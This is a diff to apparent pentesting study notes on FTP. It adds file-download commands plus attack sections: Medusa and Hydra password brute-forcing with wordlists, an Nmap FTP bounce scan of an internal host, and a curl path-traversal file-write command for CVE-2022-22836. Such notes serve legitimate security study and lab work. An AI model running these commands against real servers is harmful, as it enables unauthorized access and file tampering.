@@ -44,6 +44,17 @@ One of the most used FTP servers on Linux-based distributions is [vsFTPd](https:
 
 - `ftp <TARGET-IP> <port>` you will need to specify the port in case it is not port 21 if it is 21 you do not need to specify
 
+## Download ftp files
+
+- `wget -m --no-passive ftp://username:password@IP:2121 --starttls ftp`
+- `wget ftp://username:password@ftp_server_address/path/to/file`
+
+## lftp
+
+- [lftp man page](https://lftp.yar.ru/lftp-man.html)
+- `sudo apt install lftp`
+- `lftp -p 2121 -u anonymous, 10.10.10.10`
+
 ## Interesting commands
 
 - `status` will show configurations
@@ -83,6 +94,43 @@ Trivial File Transfer Protocol (TFTP) is simpler than FTP and performs file tran
 |quit|Exits tftp.|
 |status|Shows the current status of tftp, including the current transfer mode (ascii or binary), connection status, time-out value, and so on.|
 |verbose|Turns verbose mode, which displays additional information during file transfer, on or off.|
+
+## Bruteforcing
+
+- [Medusa](https://github.com/jmk-foofus/medusa)
+```bash
+medusa -u fiona -P /usr/share/wordlists/rockyou.txt -h 10.129.203.7 -M ftp
+medusa -U users2.list -P pws.list -h 10.129.120.4 -M ftp -n 2121
+```
+- [Hydra](https://github.com/vanhauser-thc/thc-hydra)
+```bash
+hydra -l user -p password ftp://10.10.10.10
+hydra -L user.list -P password.list ftp://10.10.10.10
+```
+
+## FTP Bounce Attack
+
+An FTP bounce attack is a network attack that uses FTP servers to deliver outbound traffic to another device on the network. The attacker uses a PORT command to trick the FTP connection into running commands and getting information from a device other than the intended server.
+
+Consider we are targetting an FTP Server FTP_DMZ exposed to the internet. Another device within the same network, Internal_DMZ, is not exposed to the internet. We can use the connection to the FTP_DMZ server to scan Internal_DMZ using the FTP Bounce attack and obtain information about the server's open ports. Then, we can use that information as part of our attack against the infrastructure.
+
+![FTP Bounce attack](../.res/2024-11-02-10-35-31.png)
+
+> Source [GeeksforGeeks](https://www.geeksforgeeks.org/what-is-ftp-bounce-attack/)
+
+The Nmap -b flag can be used to perform an FTP bounce attack:
+```bash
+nmap -Pn -v -n -p80 -b anonymous:password@10.10.110.213 172.17.0.2
+```
+
+## CVEs on FTP
+
+- [CVE-2022-22836](https://nvd.nist.gov/vuln/detail/CVE-2022-22836)  
+  This vulnerability is for an FTP service that does not correctly process the HTTP PUT request and leads to an authenticated directory/path traversal, and arbitrary file write vulnerability. This vulnerability allows us to write files outside the directory to which the service has access.  
+  Exploitation 
+  ```bash
+  curl -k -X PUT -H "Host: <IP>" --basic -u <username>:<password> --data-binary "PoC." --path-as-is https://<IP>/../../../../../../whoops
+  ```
 
 ## Resources
 
